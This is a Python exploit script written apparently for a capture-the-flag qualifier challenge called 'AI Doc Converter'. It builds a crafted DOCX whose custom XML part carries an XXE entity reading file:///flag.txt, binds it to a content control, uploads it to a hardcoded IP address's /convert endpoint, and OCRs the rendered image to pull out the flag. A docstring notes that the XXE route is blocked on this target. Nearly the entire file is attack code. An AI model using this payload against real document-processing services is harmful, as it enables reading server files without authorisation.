#!/usr/bin/env python3
"""
AI Doc Converter - CSCPT 2026 Quals
Exploit for reading /flag.txt via Aspose.Words DOCX conversion.
"""

import io
import zipfile
import requests
import subprocess
import re
from PIL import Image

TARGET = "http://178.105.86.125:26203"
TESSERACT = "/tmp/tesseract/bin/tesseract"


def ocr_image(image_data):
    """Run tesseract OCR on image bytes."""
    import tempfile
    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
        f.write(image_data)
        tmp_path = f.name
    out_path = tmp_path.replace('.png', '_ocr')
    subprocess.run([TESSERACT, tmp_path, out_path], capture_output=True)
    try:
        with open(out_path + '.txt') as f:
            return f.read()
    except:
        return ""


def send_docx(files_dict: dict) -> requests.Response:
    """Create a DOCX from file dict and upload to convert endpoint."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for path, content in files_dict.items():
            zf.writestr(path, content)
    buf.seek(0)
    return requests.post(
        f"{TARGET}/convert",
        files={"doc": ("exploit.docx", buf,
               "application/vnd.openxmlformats-officedocument.wordprocessingml.document")},
        timeout=30
    )


def exploit_sdt_binding():
    """
    Approach: Use SDT (Structured Document Tag) data binding with custom XML.
    
    The SDT mechanism binds content controls to custom XML data via XPath.
    If we can get /flag.txt content into the custom XML, it will be displayed.
    
    Current status: Entity processing disabled, so XXE doesn't work.
    Need alternative method to populate custom XML with flag content.
    """
    
    # Document with SDT binding to custom XML at /root/flag
    sdt_doc = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:sdt>
      <w:sdtPr>
        <w:dataBinding w:xpath="/root/flag" w:storeItemID="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}"/>
      </w:sdtPr>
      <w:sdtContent>
        <w:p><w:r><w:t>FLAG_NOT_FOUND</w:t></w:r></w:p>
      </w:sdtContent>
    </w:sdt>
  </w:body>
</w:document>"""

    # Custom XML with the flag data (XXE attempt - blocked)
    custom_xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root>
  <flag>&xxe;</flag>
</root>"""

    r = send_docx({
        "[Content_Types].xml": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/customXml/item1.xml" ContentType="application/xml"/>
</Types>""",
        "_rels/.rels": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>""",
        "word/_rels/document.xml.rels": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="/customXml/item1.xml"/>
</Relationships>""",
        "word/document.xml": sdt_doc,
        "customXml/item1.xml": custom_xml,
        "customXml/_rels/item1.xml.rels": """<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>""",
        "customXml/itemProps1.xml": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ds:datastoreItem ds:itemID="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" xmlns:ds="http://schemas.openxmlformats.org/officeDocument/2006/customXml"/>""",
    })

    if r.status_code == 200 and 'image/png' in r.headers.get('Content-Type', ''):
        ocr_result = ocr_image(r.content)
        print(f"OCR result:\n{ocr_result}")
        flag_match = re.search(r'CSCPT\{[^}]+\}', ocr_result)
        if flag_match:
            print(f"\n[+] FLAG: {flag_match.group(0)}")
            return flag_match.group(0)
        else:
            print("[-] Flag not found in output")
    else:
        print(f"Error: {r.status_code} - {r.text[:200]}")


def main():
    exploit_sdt_binding()


if __name__ == "__main__":
    main()
